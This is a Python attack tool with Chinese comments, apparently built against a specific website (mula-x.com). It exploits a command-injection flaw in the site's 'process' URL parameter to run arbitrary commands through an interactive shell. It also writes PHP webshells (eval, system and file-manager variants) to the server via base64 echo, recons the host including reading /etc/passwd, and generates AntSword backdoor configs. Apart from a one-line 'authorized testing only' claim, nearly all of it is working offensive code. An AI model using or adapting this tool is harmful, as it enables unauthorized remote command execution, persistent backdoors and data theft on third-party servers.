#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MULA-X 中国蚁剑连接工具
基于已验证的命令注入漏洞，提供蚁剑WebShell管理功能
仅用于授权的安全测试
"""

import requests
import base64
import json
import time
import urllib.parse
from typing import Dict, Optional, List
import argparse
import sys

class MulaXAntSwordConnector:
    """MULA-X 蚁剑连接器"""

    def __init__(self):
        self.base_url = "https://mula-x.com/"
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        })

        # 蚁剑WebShell模板
        self.webshell_templates = {
            'php_eval': '<?php @eval($_POST[\'cmd\']); ?>',
            'php_system': '<?php system($_POST[\'cmd\']); ?>',
            'php_passthru': '<?php passthru($_POST[\'cmd\']); ?>',
            'php_shell_exec': '<?php echo shell_exec($_POST[\'cmd\']); ?>',
            'advanced_webshell': '''<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    if(function_exists('system')){
        system($cmd);
    }elseif(function_exists('passthru')){
        passthru($cmd);
    }elseif(function_exists('shell_exec')){
        echo shell_exec($cmd);
    }elseif(function_exists('exec')){
        exec($cmd,$output);
        echo implode("\\n",$output);
    }
    echo "</pre>";
    die;
}
?>''',
            'file_manager_webshell': '''<?php
if(isset($_REQUEST['action']) && isset($_REQUEST['file'])){
    $action = $_REQUEST['action'];
    $file = $_REQUEST['file'];

    if($action == 'read' && file_exists($file)){
        echo base64_encode(file_get_contents($file));
    }elseif($action == 'write' && isset($_REQUEST['content'])){
        file_put_contents($file, base64_decode($_REQUEST['content']));
        echo "OK";
    }elseif($action == 'list' && is_dir($file)){
        $files = scandir($file);
        foreach($files as $f){
            if($f != '.' && $f != '..'){
                $path = $file . '/' . $f;
                $type = is_dir($path) ? 'dir' : 'file';
                $size = is_file($path) ? filesize($path) : 0;
                echo "$type:$f:$size\\n";
            }
        }
    }
}

if(isset($_POST['cmd'])){
    $cmd = $_POST['cmd'];
    echo "<pre>";
    if(function_exists('system')){
        system($cmd);
    }else{
        echo shell_exec($cmd);
    }
    echo "</pre>";
}
?>'''
        }

    def execute_command(self, command: str, timeout: int = 10) -> Dict:
        """执行系统命令"""
        try:
            # 构造命令注入载荷
            payload = f";{command}"
            encoded_payload = urllib.parse.quote(payload)

            # 发送请求
            response = self.session.get(
                f"{self.base_url}?process={encoded_payload}",
                timeout=timeout,
                verify=False
            )

            return {
                'success': True,
                'status_code': response.status_code,
                'content': response.text,
                'command': command,
                'payload': payload
            }

        except Exception as e:
            return {
                'success': False,
                'error': str(e),
                'command': command,
                'payload': payload if 'payload' in locals() else ''
            }

    def upload_webshell(self, webshell_type: str = 'advanced_webshell',
                       output_path: str = '/tmp/webshell.php') -> Dict:
        """上传WebShell文件"""
        try:
            if webshell_type not in self.webshell_templates:
                return {'success': False, 'error': f'不支持的WebShell类型: {webshell_type}'}

            # 获取WebShell代码
            webshell_code = self.webshell_templates[webshell_type]

            # Base64编码
            encoded_code = base64.b64encode(webshell_code.encode()).decode()

            # 构造上传命令
            upload_command = f"echo {encoded_code} | base64 -d > {output_path}"

            # 执行上传
            result = self.execute_command(upload_command)

            if result['success']:
                # 验证文件是否上传成功
                verify_result = self.execute_command(f"ls -la {output_path}")

                return {
                    'success': True,
                    'webshell_path': output_path,
                    'webshell_type': webshell_type,
                    'upload_result': result,
                    'verify_result': verify_result,
                    'access_url': f"{self.base_url}?process=;cat {output_path}"
                }
            else:
                return result

        except Exception as e:
            return {'success': False, 'error': str(e)}

    def test_webshell_access(self, webshell_path: str) -> Dict:
        """测试WebShell访问"""
        try:
            # 测试命令
            test_commands = [
                'whoami',
                'id',
                'pwd',
                'uname -a'
            ]

            results = []

            for cmd in test_commands:
                # 使用WebShell执行命令
                payload = f";php -r \"echo shell_exec('{cmd}');\""
                result = self.execute_command(payload)
                results.append({
                    'command': cmd,
                    'result': result
                })

                time.sleep(0.5)  # 避免请求过快

            return {
                'success': True,
                'webshell_path': webshell_path,
                'test_results': results
            }

        except Exception as e:
            return {'success': False, 'error': str(e)}

    def generate_antsword_config(self, webshell_path: str, webshell_type: str = 'advanced_webshell') -> Dict:
        """生成蚁剑配置"""
        configs = {
            'custom_request': {
                'url': self.base_url,
                'method': 'GET',
                'body': 'process=;{{COMMAND}}',
                'headers': {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                },
                'encoding': 'url'
            },
            'webshell_php': {
                'url': f"{self.base_url}?process=;include '{webshell_path}';",
                'password': 'cmd',
                'type': 'php',
                'encoder': 'base64'
            }
        }

        return configs

    def get_system_info(self) -> Dict:
        """获取系统信息"""
        info_commands = {
            'whoami': '当前用户',
            'id': '用户ID和组',
            'uname -a': '系统信息',
            'hostname': '主机名',
            'pwd': '当前目录',
            'ls -la': '目录列表',
            'ps aux | head -10': '进程列表',
            'netstat -tulpn | head -10': '网络连接',
            'cat /etc/passwd | head -5': '用户文件',
            'cat /etc/issue': '系统版本'
        }

        system_info = {}

        for cmd, desc in info_commands.items():
            result = self.execute_command(cmd)
            system_info[desc] = {
                'command': cmd,
                'result': result,
                'success': result['success']
            }
            time.sleep(0.3)

        return system_info

    def interactive_shell(self):
        """交互式Shell"""
        print("🎯 MULA-X 交互式Shell")
        print("输入 'exit' 退出，输入 'help' 查看帮助")
        print("-" * 50)

        while True:
            try:
                command = input(f"[mula-x]$ ").strip()

                if command.lower() == 'exit':
                    print("退出Shell")
                    break
                elif command.lower() == 'help':
                    print("""
可用命令:
- help          显示此帮助
- exit          退出Shell
- sysinfo       获取系统信息
- upload <type> 上传WebShell (php_eval, advanced_webshell, file_manager_webshell)
- test <path>   测试WebShell
- 其他任意Linux命令
                    """)
                    continue
                elif command.lower() == 'sysinfo':
                    info = self.get_system_info()
                    print("\n📊 系统信息:")
                    for desc, data in info.items():
                        status = "✅" if data['success'] else "❌"
                        print(f"{status} {desc}: {data['command']}")
                    print("\n使用 'info detailed' 查看详细信息")
                    continue
                elif command.startswith('info'):
                    if command == 'info detailed':
                        info = self.get_system_info()
                        print("\n📊 详细系统信息:")
                        for desc, data in info.items():
                            status = "✅" if data['success'] else "❌"
                            print(f"\n{status} {desc}: {data['command']}")
                            if data['success'] and 'content' in data['result']:
                                content = data['result']['content'][:200]
                                print(f"输出: {content}...")
                    continue
                elif command.startswith('upload '):
                    webshell_type = command.split(' ', 1)[1] if ' ' in command else 'advanced_webshell'
                    result = self.upload_webshell(webshell_type)
                    if result['success']:
                        print(f"✅ WebShell上传成功: {result['webshell_path']}")
                        print(f"访问URL: {result['access_url']}")
                    else:
                        print(f"❌ WebShell上传失败: {result.get('error', '未知错误')}")
                    continue
                elif command.startswith('test '):
                    webshell_path = command.split(' ', 1)[1] if ' ' in command else '/tmp/webshell.php'
                    result = self.test_webshell_access(webshell_path)
                    if result['success']:
                        print(f"✅ WebShell测试成功: {webshell_path}")
                        for test in result['test_results']:
                            status = "✅" if test['result']['success'] else "❌"
                            print(f"  {status} {test['command']}")
                    else:
                        print(f"❌ WebShell测试失败: {result.get('error', '未知错误')}")
                    continue
                elif not command:
                    continue

                # 执行普通命令
                result = self.execute_command(command)

                if result['success']:
                    print(f"✅ 命令执行成功")
                    if 'content' in result and result['content']:
                        # 尝试提取命令输出
                        content = result['content']
                        if len(content) > 500:
                            print(f"输出: {content[:500]}...")
                        else:
                            print(f"输出: {content}")
                else:
                    print(f"❌ 命令执行失败: {result.get('error', '未知错误')}")

            except KeyboardInterrupt:
                print("\n退出Shell")
                break
            except Exception as e:
                print(f"❌ 发生错误: {e}")

def main():
    """主函数"""
    parser = argparse.ArgumentParser(description='MULA-X 中国蚁剑连接工具')
    parser.add_argument('--upload', choices=['php_eval', 'advanced_webshell', 'file_manager_webshell'],
                       help='上传指定类型的WebShell')
    parser.add_argument('--path', default='/tmp/webshell.php', help='WebShell保存路径')
    parser.add_argument('--test', help='测试指定路径的WebShell')
    parser.add_argument('--command', help='执行单个命令')
    parser.add_argument('--sysinfo', action='store_true', help='获取系统信息')
    parser.add_argument('--interactive', action='store_true', help='启动交互式Shell')
    parser.add_argument('--config', action='store_true', help='生成蚁剑配置')

    args = parser.parse_args()

    connector = MulaXAntSwordConnector()

    print("🎯 MULA-X 中国蚁剑连接工具")
    print("=" * 50)
    print(f"目标URL: {connector.base_url}")
    print(f"漏洞类型: 命令注入")
    print("=" * 50)

    try:
        if args.upload:
            print(f"📤 上传WebShell: {args.upload}")
            result = connector.upload_webshell(args.upload, args.path)

            if result['success']:
                print(f"✅ WebShell上传成功!")
                print(f"文件路径: {result['webshell_path']}")
                print(f"访问URL: {result['access_url']}")

                # 生成蚁剑配置
                configs = connector.generate_antsword_config(result['webshell_path'], args.upload)
                print(f"\n🔧 蚁剑配置:")
                print(json.dumps(configs, indent=2, ensure_ascii=False))

            else:
                print(f"❌ WebShell上传失败: {result.get('error', '未知错误')}")

        elif args.test:
            print(f"🧪 测试WebShell: {args.test}")
            result = connector.test_webshell_access(args.test)

            if result['success']:
                print(f"✅ WebShell测试成功!")
                for test in result['test_results']:
                    status = "✅" if test['result']['success'] else "❌"
                    print(f"  {status} {test['command']}")
            else:
                print(f"❌ WebShell测试失败: {result.get('error', '未知错误')}")

        elif args.command:
            print(f"💻 执行命令: {args.command}")
            result = connector.execute_command(args.command)

            if result['success']:
                print(f"✅ 命令执行成功!")
                if 'content' in result:
                    print(f"输出:\n{result['content']}")
            else:
                print(f"❌ 命令执行失败: {result.get('error', '未知错误')}")

        elif args.sysinfo:
            print("📊 获取系统信息...")
            info = connector.get_system_info()

            print(f"\n系统信息汇总:")
            for desc, data in info.items():
                status = "✅" if data['success'] else "❌"
                print(f"{status} {desc}")

            print(f"\n详细信息已保存到: mula_x_system_info.json")
            with open('mula_x_system_info.json', 'w', encoding='utf-8') as f:
                json.dump(info, f, indent=2, ensure_ascii=False)

        elif args.config:
            print("🔧 生成蚁剑配置...")
            configs = connector.generate_antsword_config('/tmp/webshell.php')

            print("蚁剑配置:")
            print(json.dumps(configs, indent=2, ensure_ascii=False))

            with open('antsword_config.json', 'w', encoding='utf-8') as f:
                json.dump(configs, f, indent=2, ensure_ascii=False)
            print("配置已保存到: antsword_config.json")

        elif args.interactive:
            connector.interactive_shell()

        else:
            print("""
使用方法:
  python mula_x_antsword_connector.py --interactive    # 启动交互式Shell
  python mula_x_antsword_connector.py --upload advanced_webshell  # 上传WebShell
  python mula_x_antsword_connector.py --command "whoami"  # 执行单个命令
  python mula_x_antsword_connector.py --sysinfo          # 获取系统信息
  python mula_x_antsword_connector.py --config           # 生成蚁剑配置

示例:
  python mula_x_antsword_connector.py --upload advanced_webshell --path /tmp/shell.php
  python mula_x_antsword_connector.py --test /tmp/shell.php
  python mula_x_antsword_connector.py --interactive
            """)

    except KeyboardInterrupt:
        print("\n程序退出")
    except Exception as e:
        print(f"❌ 程序错误: {e}")

if __name__ == "__main__":
    main()